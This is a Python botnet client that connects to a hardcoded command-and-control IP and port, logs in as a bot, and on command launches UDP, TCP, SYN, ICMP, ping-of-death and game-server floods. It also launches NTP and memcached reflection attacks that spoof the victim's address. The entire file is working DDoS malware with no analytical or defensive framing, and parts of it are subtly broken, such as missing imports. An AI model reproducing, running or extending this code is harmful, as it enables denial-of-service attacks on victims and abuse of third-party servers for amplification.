import subprocess
import sys
subprocess.check_call([sys.executable, "-m", "pip", "install", "cloudscraper"])
import socket
import threading
import time
import random
import cloudscraper
import requests
import ctypes
from icmplib import ping as pig
from scapy.all import IP, UDP, Raw, send

C2_ADDRESS = "147.185.221.24"
C2_PORT = 21142

ntp_payload = "\x17\x00\x03\x2a" + "\x00" * 4
def NTP(target, port, timer):
    with open("ntpServers.txt", "r") as f:
        ntp_servers = f.readlines()
    packets = random.randint(10, 150)
    server = random.choice(ntp_servers).strip()
    while time.time() < timer:
        packet = (
                IP(dst=server, src=target)
                / UDP(sport=random.randint(1, 65535), dport=int(port))
                / Raw(load=ntp_payload)
        )
        for _ in range(50000000):
            send(packet, count=packets, verbose=False)

mem_payload = "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"
def MEM(target, port, timer):
    packets = random.randint(1024, 60000)
    with open("memsv.txt", "r") as f:
        memsv = f.readlines()
    server = random.choice(memsv).strip()
    while time.time() < timer:
        packet = (
                IP(dst=server, src=target)
                / UDP(sport=port, dport=11211)
                / Raw(load=mem_payload)
        )
        for _ in range(5000000):
            send(packet, count=packets, verbose=False)

def icmp(target, timer):
    while time.time() < timer:
        for _ in range(5000000):
            packet = random._urandom(int(random.randint(1024, 60000)))
            pig(target, count=10, interval=0.2, payload_size=len(packet), payload=packet)

def pod(target, timer):
    while time.time() < timer:
        rand_addr = spoofer()
        ip_hdr = IP(src=rand_addr, dst=target)
        packet = ip_hdr / ICMP() / ("m" * 60000)
        send(packet)

def spoofer():
    addr = [192, 168, 0, 1]
    d = '.'
    addr[0] = str(random.randrange(11, 197))
    addr[1] = str(random.randrange(0, 255))
    addr[2] = str(random.randrange(0, 255))
    addr[3] = str(random.randrange(2, 254))
    assemebled = addr[0] + d + addr[1] + d + addr[2] + d + addr[3]
    return assemebled

def attack_udp(ip, port, secs, size=65500):
    while time.time() < secs:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        dport = random.randint(1, 65535) if port == 0 else port
        data = random._urandom(size)
        s.sendto(data, (ip, dport))

def attack_tcp(ip, port, secs, size=65500):
    while time.time() < secs:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        while time.time() < secs:
            s.send(random._urandom(size))

def attack_syn(ip, port, secs):
    while time.time() < secs:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        flags = 0b01000000
        s.connect((ip, port))
        pkt = struct.pack('!HHIIBBHHH', 1234, 5678, 0, 1234, flags, 0, 0, 0, 0)
        while time.time() < secs:
            s.send(pkt)
        s.close()

def attack_tup(ip, port, secs, size=65500):
    while time.time() < secs:
        udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        dport = random.randint(1, 65535) if port == 0 else port
        data = random._urandom(size)
        tcp.connect((ip, port))
        udp.sendto(data, (ip, dport))
        tcp.send(data)

def attack_hex(ip, port, secs):
    payload = b'\x55\x55\x55\x55\x00\x00\x00\x01'
    while time.time() < secs:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.sendto(payload, (ip, port))

def attack_roblox(ip, port, secs, size=65400):
    while time.time() < secs:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes = random._urandom(size)
        dport = random.randint(1, 65535) if port == 0 else port
        for _ in range(1500):
            ran = random.randrange(10 ** 80)
            hex = "%064x" % ran
            hex = hex[:64]
            s.sendto(bytes.fromhex(hex) + bytes, (ip, dport))

def attack_junk(ip, port, secs):
    payload = b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
    while time.time() < secs:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.sendto(payload, (ip, port))

def handle_c2_connection(c2):
    c2.send('669787761736865726500'.encode())
    while True:
        time.sleep(1)
        data = c2.recv(1024).decode()
        if 'Username' in data:
            c2.send('BOT'.encode())
            break
    while True:
        time.sleep(1)
        data = c2.recv(1024).decode()
        if 'Password' in data:
            c2.send('\xff\xff\xff\xff\75'.encode('cp1252'))
            break
    while True:
        try:
            data = c2.recv(1024).decode().strip()
            if not data:
                break
            args = data.split(' ')
            command = args[0].upper()
            print(f"Received request: {data}")
            if command == '!UDP':
                ip = args[1]
                port = int(args[2])
                secs = time.time() + int(args[3])
                threads = int(args[4])
                for _ in range(threads):
                    threading.Thread(target=attack_udp, args=(ip, port, secs), daemon=True).start()
            elif command == '!TCP':
                ip = args[1]
                port = int(args[2])
                secs = time.time() + int(args[3])
                threads = int(args[4])
                for _ in range(threads):
                    threading.Thread(target=attack_tcp, args=(ip, port, secs), daemon=True).start()
            elif command == '!HEX':
                ip = args[1]
                port = int(args[2])
                secs = time.time() + int(args[3])
                threads = int(args[4])
                for _ in range(threads):
                    threading.Thread(target=attack_hex, args=(ip, port, secs), daemon=True).start()
            elif command == '!ROBLOX':
                ip = args[1]
                port = int(args[2])
                secs = time.time() + int(args[3])
                threads = int(args[4])
                for _ in range(threads):
                    threading.Thread(target=attack_roblox, args=(ip, port, secs), daemon=True).start()
            elif command == '!JUNK':
                ip = args[1]
                port = int(args[2])
                secs = time.time() + int(args[3])
                threads = int(args[4])
                for _ in range(threads):
                    threading.Thread(target=attack_junk, args=(ip, port, secs), daemon=True).start()
                    threading.Thread(target=attack_udp, args=(ip, port, secs), daemon=True).start()
                    threading.Thread(target=attack_tcp, args=(ip, port, secs), daemon=True).start()
            elif command == '!NTP':
                ip = args[1]
                port = int(args[2])
                timer = time.time() + int(args[3])
                threads = int(args[4])
                for _ in range(threads):
                    threading.Thread(target=NTP, args=(ip, port, timer), daemon=True).start()
            elif command == '!MEM':
                ip = args[1]
                port = int(args[2])
                timer = time.time() + int(args[3])
                threads = int(args[4])
                for _ in range(threads):
                    threading.Thread(target=MEM, args=(ip, port, timer), daemon=True).start()
            elif command == '!ICMP':
                ip = args[1]
                timer = time.time() + int(args[2])
                threads = int(args[3])
                for _ in range(threads):
                    threading.Thread(target=icmp, args=(ip, timer), daemon=True).start()
            elif command == '!POD':
                ip = args[1]
                timer = time.time() + int(args[2])
                threads = int(args[3])
                for _ in range(threads):
                    threading.Thread(target=pod, args=(ip, timer), daemon=True).start()
            elif command == '!SYN':
                ip = args[1]
                port = int(args[2])
                secs = time.time() + int(args[3])
                threads = int(args[4])
                for _ in range(threads):
                    threading.Thread(target=attack_syn, args=(ip, port, secs), daemon=True).start()
            elif command == '!PING':
                c2.send('PONG'.encode())
        except:
            break
    c2.close()

def reconnect_thread():
    while True:
        try:
            c2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            c2.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            c2.connect((C2_ADDRESS, C2_PORT))
            threading.Thread(target=handle_c2_connection, args=(c2,), daemon=True).start()
        except:
            if 'c2' in locals():
                c2.close()
        time.sleep(1)

def main():
    while True:
        threading.Thread(target=reconnect_thread, daemon=True).start()
        while True:
            time.sleep(30)

if __name__ == '__main__':
    main()
